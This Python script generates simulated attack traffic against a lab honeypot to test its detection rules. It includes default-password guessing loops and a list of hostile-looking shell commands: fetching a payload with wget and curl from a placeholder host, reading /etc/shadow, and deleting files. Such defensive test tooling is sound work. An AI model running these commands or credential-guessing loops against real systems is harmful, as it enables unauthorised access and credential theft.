"""
Safe test-traffic generator for the honeypot project.

USAGE NOTE: --target must be a host you own or have explicit permission
to test, and in practice should always be your own lab honeypot's
address on your isolated network. This script does not scan, does not
discover hosts, and only ever connects to the single --target you
provide.

Run this from your lab's "attacker" container/VM, never from a machine
outside your isolated network.
"""
import argparse
import random
import socket
import sys
import time

# Deliberately harmless / fake-looking credentials -- these are test
# inputs for OUR OWN detection engine, not a real wordlist aimed at any
# real system.
COMMON_USERNAMES = ["root", "admin", "test", "guest", "oracle", "ubuntu", "pi", "support"]
COMMON_PASSWORDS = ["123456", "password", "admin", "toor", "letmein", "qwerty"]
SUSPICIOUS_COMMANDS = [
    "wget http://example-lab-internal/payload.sh",
    "cat /etc/shadow",
    "chmod +x payload.sh",
    "rm -rf /tmp/test",
    "curl -s http://example-lab-internal/x | base64 -d",
]
NORMAL_COMMANDS = ["ls", "pwd", "whoami", "echo hello"]


def _connect(host: str, port: int, timeout: float = 5.0) -> socket.socket:
    return socket.create_connection((host, port), timeout=timeout)


def _read_until(sock: socket.socket, marker: bytes = b": ", max_bytes: int = 4096) -> bytes:
    """Reads until we see the expected prompt marker or run out of patience."""
    data = b""
    sock.settimeout(5.0)
    try:
        while marker not in data and len(data) < max_bytes:
            chunk = sock.recv(1024)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data


def _send_line(sock: socket.socket, line: str) -> None:
    sock.sendall((line + "\n").encode())


def scenario_normal_connection(host: str, port: int) -> None:
    """Connects, reads the banner, sends one (fake) login, then disconnects politely."""
    print("[normal_connection] connecting...")
    with _connect(host, port) as sock:
        banner = _read_until(sock, marker=b"login")
        print(f"[normal_connection] banner: {banner!r}")
        _send_line(sock, "guestuser")
        _read_until(sock, marker=b"Password")
        _send_line(sock, "not-a-real-password")
        resp = _read_until(sock, marker=b"\n")
        print(f"[normal_connection] response: {resp!r}")
    print("[normal_connection] done\n")


def scenario_failed_login(host: str, port: int) -> None:
    """One deliberate failed login attempt with an obviously fake credential pair."""
    print("[failed_login] connecting...")
    with _connect(host, port) as sock:
        _read_until(sock, marker=b"login")
        _send_line(sock, "testuser")
        _read_until(sock, marker=b"Password")
        _send_line(sock, "wrongpassword")
        resp = _read_until(sock, marker=b"denied")
        print(f"[failed_login] response: {resp!r}")
    print("[failed_login] done\n")


def scenario_repeated_login_attempts(host: str, port: int, attempts: int = 6) -> None:
    """
    A single connection cycling through several username/password pairs --
    exactly the pattern rule_repeated_auth_failures looks for.
    """
    print(f"[repeated_attempts] connecting, will attempt {attempts} logins...")
    with _connect(host, port) as sock:
        _read_until(sock, marker=b"login")
        for i in range(attempts):
            user = random.choice(COMMON_USERNAMES)
            pw = random.choice(COMMON_PASSWORDS)
            _send_line(sock, user)
            _read_until(sock, marker=b"Password")
            _send_line(sock, pw)
            resp = _read_until(sock, marker=b"\n")
            print(f"[repeated_attempts] attempt {i+1}/{attempts} user={user!r}: {resp!r}")
            if b"Too many" in resp:
                break
            _read_until(sock, marker=b"login", max_bytes=256)  # next prompt, if any
    print("[repeated_attempts] done\n")


def scenario_suspicious_request(host: str, port: int) -> None:
    """
    Logs in (gets fake-rejected as always), then, if the server has
    FAKE_SHELL_ENABLED, sends command-like lines to exercise the
    command-logging path. This honeypot never grants real shell access,
    so this scenario is only meaningful if the fake shell is enabled on
    the server you're testing against.
    """
    print("[suspicious_request] connecting...")
    with _connect(host, port) as sock:
        _read_until(sock, marker=b"login")
        _send_line(sock, "admin")
        _read_until(sock, marker=b"Password")
        _send_line(sock, "admin")
        _read_until(sock, marker=b"denied")

        for cmd in random.sample(SUSPICIOUS_COMMANDS, k=2):
            _send_line(sock, cmd)
            resp = _read_until(sock, marker=b"\n")
            print(f"[suspicious_request] sent {cmd!r}: {resp!r}")
    print("[suspicious_request] done\n")


def scenario_multiple_connections(host: str, port: int, count: int = 5, delay: float = 0.5) -> None:
    """
    Several short connections in quick succession -- exercises
    rule_rapid_connections.
    """
    print(f"[multiple_connections] opening {count} connections, {delay}s apart...")
    for i in range(count):
        try:
            with _connect(host, port, timeout=3.0) as sock:
                _read_until(sock, marker=b"login", max_bytes=256)
                _send_line(sock, "scanner")
                _read_until(sock, marker=b"Password", max_bytes=256)
                _send_line(sock, "scanner")
        except (OSError, socket.timeout) as exc:
            print(f"[multiple_connections] connection {i+1} error (expected under load): {exc}")
        print(f"[multiple_connections] connection {i+1}/{count} complete")
        time.sleep(delay)
    print("[multiple_connections] done\n")


SCENARIOS = {
    "normal": scenario_normal_connection,
    "failed_login": scenario_failed_login,
    "repeated": scenario_repeated_login_attempts,
    "suspicious": scenario_suspicious_request,
    "multi": scenario_multiple_connections,
}


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Safe test-traffic generator for the honeypot lab. "
        "Only ever targets the single host/port you specify -- run this "
        "against your own isolated lab honeypot only."
    )
    parser.add_argument("--target", required=True, help="Honeypot host/IP on your isolated lab network")
    parser.add_argument("--port", type=int, default=2222)
    parser.add_argument(
        "--scenario", choices=list(SCENARIOS.keys()) + ["all"], default="all",
        help="Which scenario to run (default: all, run in sequence)",
    )
    parser.add_argument("--confirm-lab", action="store_true",
                         help="Required flag: confirms --target is your own isolated lab environment")
    args = parser.parse_args()

    if not args.confirm_lab:
        print(
            "Refusing to run: pass --confirm-lab to confirm that "
            f"{args.target}:{args.port} is a honeypot on your own isolated "
            "lab network, not a real or third-party system.",
            file=sys.stderr,
        )
        sys.exit(1)

    print("=" * 70)
    print(f" Simulating test traffic against {args.target}:{args.port}")
    print(" (This should be your own isolated lab honeypot. Ctrl+C to stop.)")
    print("=" * 70)

    scenarios_to_run = SCENARIOS.items() if args.scenario == "all" else [(args.scenario, SCENARIOS[args.scenario])]
    for name, fn in scenarios_to_run:
        try:
            fn(args.target, args.port)
        except (OSError, socket.timeout) as exc:
            print(f"[{name}] connection error: {exc}\n")
        time.sleep(1)

    print("All requested scenarios complete. Check the dashboard / detection pass results.")


if __name__ == "__main__":
    main()
